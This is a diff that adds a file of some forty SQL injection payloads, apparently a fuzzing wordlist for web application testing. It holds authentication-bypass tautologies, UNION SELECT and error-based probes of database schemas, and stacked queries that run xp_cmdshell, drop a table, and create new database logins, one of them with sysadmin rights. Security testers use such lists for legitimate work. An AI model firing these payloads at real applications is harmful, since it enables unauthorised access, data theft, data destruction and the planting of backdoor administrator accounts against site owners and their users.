@@ -1,0 +1,41 @@
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY 'pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; 
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
